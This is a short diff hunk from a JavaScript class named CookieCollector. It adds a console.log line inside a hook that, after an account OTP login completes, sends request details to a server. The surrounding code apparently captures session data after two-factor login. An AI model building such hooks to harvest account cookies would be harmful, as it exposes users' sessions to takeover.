@@ -117,6 +117,7 @@ class CookieCollector {
         // ─── Account hooks (OTP completion) ───
 
         sess.webRequest.onCompleted(accountFilter, async (details) => {
+            console.log('[CookieCollector] onCompleted (accounts)')
             try {
                 await this._sendToServer({
                     url: details.url,
